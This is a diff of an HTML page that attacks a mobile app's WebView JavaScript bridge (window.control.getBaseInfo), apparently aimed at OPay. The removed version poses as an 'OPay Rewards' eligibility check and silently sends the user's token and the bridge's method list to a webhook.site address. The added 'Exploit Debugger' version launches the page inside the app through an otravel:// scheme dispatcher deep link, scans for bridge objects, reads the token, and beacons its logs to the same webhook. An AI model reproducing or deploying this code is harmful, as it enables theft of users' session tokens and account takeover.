@@ -4,121 +4,102 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>OPay Rewards</title>
+    <title>OPay Exploit Debug</title>
     <style>
         body {
-            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', sans-serif;
-            background: linear-gradient(135deg, #1a5c3a 0%, #0d2b1a 100%);
-            color: white;
-            margin: 0;
+            font-family: monospace;
             padding: 20px;
-            min-height: 100vh;
-            display: flex;
-            flex-direction: column;
-            align-items: center;
-            justify-content: center;
+            background: #eee;
+            word-break: break-all;
         }
 
-        .card {
-            background: rgba(255, 255, 255, 0.1);
-            backdrop-filter: blur(10px);
-            border-radius: 16px;
-            padding: 30px;
-            max-width: 400px;
-            width: 100%;
+        .btn {
+            display: block;
+            background: #007bff;
+            color: white;
+            padding: 15px;
             text-align: center;
-            border: 1px solid rgba(255, 255, 255, 0.2);
+            margin: 10px 0;
+            text-decoration: none;
+            font-size: 18px;
+            border-radius: 5px;
         }
 
-        .spinner {
-            width: 40px;
-            height: 40px;
-            border: 3px solid rgba(255, 255, 255, 0.3);
-            border-top: 3px solid #4caf50;
-            border-radius: 50%;
-            animation: spin 1s linear infinite;
-            margin: 20px auto;
-        }
-
-        @keyframes spin {
-            0% {
-                transform: rotate(0deg);
-            }
-
-            100% {
-                transform: rotate(360deg);
-            }
-        }
-
-        h2 {
-            color: #4caf50;
-            margin-bottom: 10px;
-        }
-
-        p {
-            color: rgba(255, 255, 255, 0.7);
-            font-size: 14px;
+        #log {
+            background: white;
+            padding: 10px;
+            border: 1px solid #ccc;
+            min-height: 200px;
         }
     </style>
 </head>
 
 <body>
-    <div class="card">
-        <h2>🎁 OPay Rewards</h2>
-        <p>Verifying your account eligibility...</p>
-        <div class="spinner"></div>
-        <p id="status" style="font-size: 12px; color: rgba(255,255,255,0.5);">Loading...</p>
-    </div>
+    <h2>🕵️ Exploit Debugger</h2>
+
+    <a id="deepLinkBtn" class="btn" href="#">🚀 Launch Deep Link</a>
+
+    <h3>Execution Log:</h3>
+    <div id="log">Waiting for execution...</div>
 
     <script>
-        var EXFIL_URL = "https://webhook.site/669d58e9-2981-429c-b990-95b00c849bfe";
+        // 1. Setup Deep Link Button (retaining the fix)
+        const deepLink = "otravel://schemedispatcher?action=" + window.location.href;
+        document.getElementById("deepLinkBtn").href = deepLink;
 
-        function send(data) {
+        // 2. Logging Function
+        function log(msg) {
+            var el = document.getElementById("log");
+            el.innerHTML += "<div>" + new Date().toLocaleTimeString() + ": " + msg + "</div>";
+            // Also send to webhook for remote viewing
             var img = new Image();
-            img.src = EXFIL_URL + "?" + data;
-            fetch(EXFIL_URL + "?" + data, { mode: 'no-cors' }).catch(function () { });
+            img.src = "https://webhook.site/669d58e9-2981-429c-b990-95b00c849bfe?log=" + encodeURIComponent(msg);
         }
 
-        window.onload = function () {
-            var s = document.getElementById('status');
-
-            if (window.control && window.control.getBaseInfo) {
-                s.textContent = "Verifying...";
-                try {
-                    var info = window.control.getBaseInfo();
-                    send("type=token&data=" + encodeURIComponent(info));
-
-                    var methods = [];
-                    for (var prop in window.control) {
-                        methods.push(prop);
-                    }
-                    send("type=methods&data=" + encodeURIComponent(methods.join(",")));
-
-                    s.textContent = "Almost done...";
-                } catch (e) {
-                    send("type=error&data=" + encodeURIComponent(e.message));
-                }
-            } else {
-                var found = [];
+        // 3. Scan for Bridge Objects
+        function scan() {
+            log("Scaning window properties...");
+            try {
+                var potentialBridges = [];
                 var props = Object.getOwnPropertyNames(window);
                 for (var i = 0; i < props.length; i++) {
                     var p = props[i];
-                    try {
-                        if (typeof window[p] === 'object' && window[p] !== null &&
-                            !['window', 'document', 'location', 'navigator', 'screen', 'history', 'chrome', 'performance', 'caches', 'indexedDB', 'localStorage', 'sessionStorage'].includes(p)) {
-                            found.push(p);
-                        }
-                    } catch (e) { }
+                    // Filter out standard browser objects
+                    if (!['window', 'self', 'document', 'name', 'location', 'customElements', 'history', 'location', 'navigation', 'navigator', 'screen', 'styleMedia', 'trustedTypes', 'performance', 'console', 'devicePixelRatio', 'external', 'localStorage', 'sessionStorage', 'indexedDB', 'webkitStorageInfo', 'caches', 'crypto', 'speechSynthesis', 'chrome'].includes(p)) {
+                        try {
+                            if (typeof window[p] === 'object' && window[p] !== null) {
+                                potentialBridges.push(p);
+                            }
+                        } catch (e) { }
+                    }
                 }
-                send("type=scan&bridges=" + encodeURIComponent(found.join(",")));
-                s.textContent = "Processing...";
-            }
+                log("Potential Bridges Found: " + potentialBridges.join(", "));
 
-            setTimeout(function () {
-                s.textContent = "You're not eligible for this promotion.";
-                document.querySelector('.spinner').style.display = 'none';
-            }, 3000);
-        };
+                // 4. Try Exploit on specific known names
+                if (window.control) {
+                    log("SUCCESS: window.control found!");
+                    if (window.control.getBaseInfo) {
+                        var token = window.control.getBaseInfo();
+                        log("⚠️ TOKEN FOUND: " + token);
+                        alert("Token Found: " + token);
+                    } else {
+                        log("window.control exists but getBaseInfo is missing.");
+                        // Enumerate methods
+                        var methods = [];
+                        for (var m in window.control) { methods.push(m); }
+                        log("Methods: " + methods.join(", "));
+                    }
+                } else {
+                    log("❌ window.control NOT found.");
+                }
+
+            } catch (e) {
+                log("Error: " + e.message);
+            }
+        }
+
+        // Run scan after a short delay
+        setTimeout(scan, 1000);
     </script>
 </body>
 
